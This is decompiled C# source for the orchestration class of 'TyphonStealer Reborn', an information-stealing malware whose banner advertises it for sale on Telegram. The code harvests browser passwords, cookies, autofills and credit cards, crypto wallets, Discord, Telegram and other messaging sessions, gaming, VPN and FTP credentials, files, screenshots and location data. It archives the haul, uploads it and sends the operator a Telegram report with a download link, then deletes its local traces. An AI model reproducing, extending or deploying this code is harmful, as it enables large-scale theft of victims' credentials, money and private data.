using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Threading;
using Typhon.Modules.FileGrabber;
using Typhon.Modules.Miscellaneous;
using Typhon.Stealer.Software.Browsers.Chromium;
using Typhon.Stealer.Software.Browsers.Edge;
using Typhon.Stealer.Software.Browsers.Gecko;
using Typhon.Stealer.Software.CryptoApps;
using Typhon.Stealer.Software.FTP;
using Typhon.Stealer.Software.Gaming;
using Typhon.Stealer.Software.Messaging;
using Typhon.Stealer.Software.VPN;
using Typhon.Stealer.SystemInfo;

namespace Typhon.Stealer
{
	// Token: 0x02000005 RID: 5
	internal class Save
	{
		// Token: 0x0600000A RID: 10 RVA: 0x00002320 File Offset: 0x00000520
		public static void SaveData()
		{
			Save.SaveUserDatails();
			Save.SaveNetworkDetails();
			Save.SaveHardwareDetails();
			List<Thread> list = new List<Thread>();
			if (Config.GrabDesktop == "1")
			{
				SaveScreenshot.GrabDesktop(Save.SavePath, 0);
			}
			Directory.CreateDirectory(Save.SavePath + "\\System Info");
			list.Add(new Thread(delegate()
			{
				SaveRunningProcess.WriteProcessList(Save.SavePath + "\\System Info");
				SaveOpenedWindows.SaveActiveWindow(Save.SavePath + "\\System Info");
				SaveOpenedWindows.SaveActiveWindow(Save.SavePath + "\\System Info");
			}));
			list.Add(new Thread(delegate()
			{
				GetWifiDetails.SavedNetworks(Save.SavePath + "\\System Info");
				GetWifiDetails.ScanningNetworks(Save.SavePath + "\\System Info");
			}));
			if (Config.RecoverBrowser == "1")
			{
				list.Add(new Thread(delegate()
				{
					ChromiumRecovery.SaveData(Save.SavePath);
					Thread.Sleep(500);
					GeckoRecovery.SaveData(Save.SavePath);
					Thread.Sleep(500);
					EdgeRecovery.SaveData(Save.SavePath);
				}));
			}
			if (Config.GetCryptoCurrencyWalletsBrowser == "1")
			{
				list.Add(new Thread(delegate()
				{
					ChromeCryptoExtensionStealer.GetChromeWallets(Save.SavePath + "\\Software\\Crypto Wallets [Browser]\\Chrome");
					EdgeCryptoExtensionStealer.GetEdgeWallets(Save.SavePath + "\\Software\\Crypto Wallets [Browser]\\Edge");
				}));
			}
			if (Config.GetCryptoCurrencyWalletsApps == "1")
			{
				list.Add(new Thread(delegate()
				{
					CryptoWalletStealer.CopyWallet_dat(Save.SavePath + "\\Software\\Crypto Wallets [Apps]");
				}));
			}
			if (Config.GetIMClients == "1")
			{
				list.Add(new Thread(delegate()
				{
					Discord.GetTokens(Save.SavePath + "\\Software\\IM Clients\\Discord");
					Telegram.StealSession(Save.SavePath + "\\Software\\IM Clients\\Telegram");
					Tox.GetSession(Save.SavePath + "\\Software\\IM Clients\\Tox");
					Signal.GetSession(Save.SavePath + "\\Software\\IM Clients\\Tox");
					Element.GetSession(Save.SavePath + "\\Software\\IM Clients\\Element");
					Outlook.GrabOutlook(Save.SavePath + "\\Software\\IM Clients\\Outlook");
					Skype.GetSession(Save.SavePath + "\\Software\\IM Clients\\Skype");
					Pidgin.EnumerateLogins(Save.SavePath + "\\Software\\IM Clients\\Pidgin");
					ICQ.GetSession(Save.SavePath + "\\Software\\IM Clients\\ICQ");
				}));
			}
			if (Config.GetGamingClients == "1")
			{
				list.Add(new Thread(delegate()
				{
					Minecraft.SaveAll(Save.SavePath + "\\Software\\Gaming\\Minecraft");
					Steam.GetSteamSession(Save.SavePath + "\\Software\\Gaming\\Steam");
					BattleNET.GetSession(Save.SavePath + "\\Software\\Gaming\\BattleNET");
				}));
			}
			if (Config.GetVPNClients == "1")
			{
				list.Add(new Thread(delegate()
				{
					Class1.Save(Save.SavePath + "\\Software\\VPN Clients\\NordVPN");
					Class2.Save(Save.SavePath + "\\Software\\VPN Clients\\OpenVPN");
					Class3.Save(Save.SavePath + "\\Software\\VPN Clients\\ProtonVPN");
				}));
			}
			if (Config.GrabberModule == "1")
			{
				list.Add(new Thread(delegate()
				{
					FileStealer.BeginFG(Save.SavePath + "\\File Grabber");
				}));
			}
			if (Config.GetFTPClients == "1")
			{
				list.Add(new Thread(delegate()
				{
					Directory.CreateDirectory(Save.SavePath + "\\Software\\FTP");
					Directory.CreateDirectory(Save.SavePath + "\\Software\\FTP\\WinSCP");
					DataFormatter.WritePassword(WinSCP.GetWinSCPPasswords(), Save.SavePath + "\\Software\\FTP\\WinSCP", "WinSCP");
					if (Directory.Exists(Save.SavePath + "\\Software\\FTP\\WinSCP"))
					{
						if (Directory.GetFiles(Save.SavePath + "\\Software\\FTP\\WinSCP").Length == 0)
						{
							IOHelper.DeleteDirectory(Save.SavePath + "\\Software\\FTP\\WinSCP", false);
						}
						else
						{
							foreach (string path in Directory.GetFiles(Save.SavePath + "\\Software\\FTP\\WinSCP"))
							{
								if (File.ReadAllText(path).Length < 20)
								{
									File.Delete(path);
								}
							}
						}
					}
					FileZilla.WritePasswords(Save.SavePath + "\\Software\\FTP\\FileZilla");
					if (Directory.Exists(Save.SavePath + "\\Software\\FTP\\FileZilla"))
					{
						if (Directory.GetFiles(Save.SavePath + "\\Software\\FTP\\FileZilla").Length == 0)
						{
							IOHelper.DeleteDirectory(Save.SavePath + "\\Software\\FTP\\FileZilla", false);
						}
						else
						{
							foreach (string path2 in Directory.GetFiles(Save.SavePath + "\\Software\\FTP\\FileZilla"))
							{
								if (File.ReadAllText(path2).Length < 20)
								{
									File.Delete(path2);
								}
							}
						}
					}
					if (Directory.GetDirectories(Save.SavePath + "\\Software\\FTP").Length == 0)
					{
						IOHelper.DeleteDirectory(Save.SavePath + "\\Software\\FTP", false);
					}
				}));
			}
			foreach (Thread thread in list)
			{
				thread.Start();
			}
			foreach (Thread thread2 in list)
			{
				if (thread2.IsAlive)
				{
					thread2.Join();
				}
			}
			try
			{
				Thread.Sleep(700);
				string text = string.Concat(new string[]
				{
					UserDetails.GetUserName(),
					"@",
					UserDetails.GetMachineName(),
					"_",
					HardwareDetails.GetHWID(),
					".zip"
				});
				string text2 = Networking.Upload(IOHelper.CreateArchive(Save.SavePath, text), true);
				try
				{
					Telegram.SendMessage(string.Concat(new string[]
					{
						"\ud83d\udc09 New TyphonReborn log!\n\n\ud83d\udc64 User details:\nDate: ",
						UserDetails.GetDate(),
						"\nUser name: ",
						UserDetails.GetUserName(),
						"\nMachine name: ",
						UserDetails.GetMachineName(),
						"\nAnti-Virus software: \n",
						UserDetails.GetAntiVirus(),
						"\n\n\ud83e\udd77 System info:\nOperating System: ",
						UserDetails.GetSystemVersion(),
						"\nHWID: ",
						HardwareDetails.GetHWID(),
						"\nProcessor: ",
						HardwareDetails.GetProcessorName(),
						"\nMemory: ",
						HardwareDetails.GetMemoryAmount(),
						"\nGraphics card: ",
						HardwareDetails.GetGraphicsCard(),
						"\nBattery status: ",
						HardwareDetails.GetBatteryStatus(),
						"\nScreen metrics: ",
						HardwareDetails.GetScreenMetrics(),
						"\n\n\ud83d\udce1 Network details:\nExternal IP: ",
						UserDetails.GetPublicIP(),
						"\nInternal IP: ",
						UserDetails.GetLocalIP(),
						"\nMAC address: ",
						UserDetails.GetMAC(),
						"\nBSSID: ",
						UserDetails.GetLocation(0),
						"\n\n\ud83d\udccd Location details:\nBSSID-based location:\n",
						UserDetails.GetLocation(1),
						"\nIP-Based location:\n",
						UserDetails.GetIPBasedLocation(),
						"\n\n\ud83d\udd22 Important details:\n\t\t\t\ud83d\udd11 Passwords amount: ",
						Counter.Passwords.ToString(),
						"\n\t\t\t\ud83c\udf6a Cookies amount: ",
						Counter.Cookies.ToString(),
						"\n\t\t\t\ud83d\udcc2 Autofills amount: ",
						Counter.Autofills.ToString(),
						"\n\t\t\t\ud83d\udcb3 Credit Cards amount: ",
						Counter.CC.ToString(),
						"\n\t\t\t\ud83d\udce1 FTP hosts amount: ",
						Counter.FtpHosts.ToString(),
						"\n\n\ud83d\udd17 Archive Download Link: ",
						text2,
						"\nTyphonReborn v1.0 by @lernaean_hydra0 & @RaaSteK1337"
					}));
				}
				catch (Exception value)
				{
					Console.WriteLine(value);
				}
				File.Delete(text);
				IOHelper.DeleteDirectory(Save.SavePath, false);
			}
			catch (Exception value2)
			{
				Console.WriteLine(value2);
			}
		}

		// Token: 0x0600000B RID: 11 RVA: 0x000028B0 File Offset: 0x00000AB0
		private static void SaveNetworkDetails()
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine("************************************");
			stringBuilder.AppendLine("*      TyphonStealer_Reborn_v1     *");
			stringBuilder.AppendLine("*              by @lernaean_hydra0 *");
			stringBuilder.AppendLine("*                                  *");
			stringBuilder.AppendLine("* Buy it on Telegram:              *");
			stringBuilder.AppendLine("*         https://t.me/typhon_shop *");
			stringBuilder.AppendLine("************************************");
			stringBuilder.AppendLine("NETWORK DETAILS:\n");
			stringBuilder.AppendLine("Public IP: " + UserDetails.GetPublicIP());
			stringBuilder.AppendLine("Private IP: " + UserDetails.GetLocalIP());
			stringBuilder.AppendLine("BSSID: " + UserDetails.GetLocation(0));
			stringBuilder.AppendLine("BSSID-Based location: " + UserDetails.GetLocation(1));
			stringBuilder.AppendLine("MAC Address: " + UserDetails.GetMAC());
			File.WriteAllText(Save.SavePath + "\\NetworkInformation.txt", stringBuilder.ToString());
		}

		// Token: 0x0600000C RID: 12 RVA: 0x000029B0 File Offset: 0x00000BB0
		private static void SaveUserDatails()
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine("************************************");
			stringBuilder.AppendLine("*      TyphonStealer_Reborn_v1     *");
			stringBuilder.AppendLine("*              by @lernaean_hydra0 *");
			stringBuilder.AppendLine("*                                  *");
			stringBuilder.AppendLine("* Buy it on Telegram:              *");
			stringBuilder.AppendLine("*         https://t.me/typhon_shop *");
			stringBuilder.AppendLine("************************************");
			stringBuilder.AppendLine("USER DETAILS:\n");
			stringBuilder.AppendLine("Username: " + UserDetails.GetUserName());
			stringBuilder.AppendLine("Machine name: " + UserDetails.GetMachineName());
			stringBuilder.AppendLine("Current language: " + UserDetails.GetLanguage());
			stringBuilder.AppendLine("Current date: " + UserDetails.GetDate());
			stringBuilder.AppendLine("Operating System: " + UserDetails.GetSystemVersion());
			stringBuilder.AppendLine("Anti-Virus software(s): " + UserDetails.GetAntiVirus());
			stringBuilder.AppendLine();
			stringBuilder.AppendLine("Available languages:");
			stringBuilder.AppendLine(UserDetails.GetAvailableLanguages() + Environment.NewLine);
			stringBuilder.AppendLine("IP details:");
			stringBuilder.AppendLine(UserDetails.GetUserData());
			File.WriteAllText(Save.SavePath + "\\UserDetails.txt", stringBuilder.ToString());
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00002B04 File Offset: 0x00000D04
		private static void SaveHardwareDetails()
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine("************************************");
			stringBuilder.AppendLine("*      TyphonStealer_Reborn_v1     *");
			stringBuilder.AppendLine("*              by @lernaean_hydra0 *");
			stringBuilder.AppendLine("*                                  *");
			stringBuilder.AppendLine("* Buy it on Telegram:              *");
			stringBuilder.AppendLine("*         https://t.me/typhon_shop *");
			stringBuilder.AppendLine("************************************");
			stringBuilder.AppendLine("HARDWARE DETAILS:\n");
			stringBuilder.AppendLine("HWID: " + HardwareDetails.GetHWID());
			stringBuilder.AppendLine("Processor: " + HardwareDetails.GetProcessorName());
			stringBuilder.AppendLine("Graphics card: " + HardwareDetails.GetGraphicsCard());
			stringBuilder.AppendLine("Installed Memory (MB): " + HardwareDetails.GetMemoryAmount());
			stringBuilder.AppendLine("Screen metrics: " + HardwareDetails.GetScreenMetrics());
			stringBuilder.AppendLine("Battery status: " + HardwareDetails.GetBatteryStatus());
			File.WriteAllText(IOHelper.SetCWD() + "\\HardwareDetails.txt", stringBuilder.ToString());
		}

		// Token: 0x04000017 RID: 23
		internal static string SavePath = IOHelper.SetCWD();
	}
}
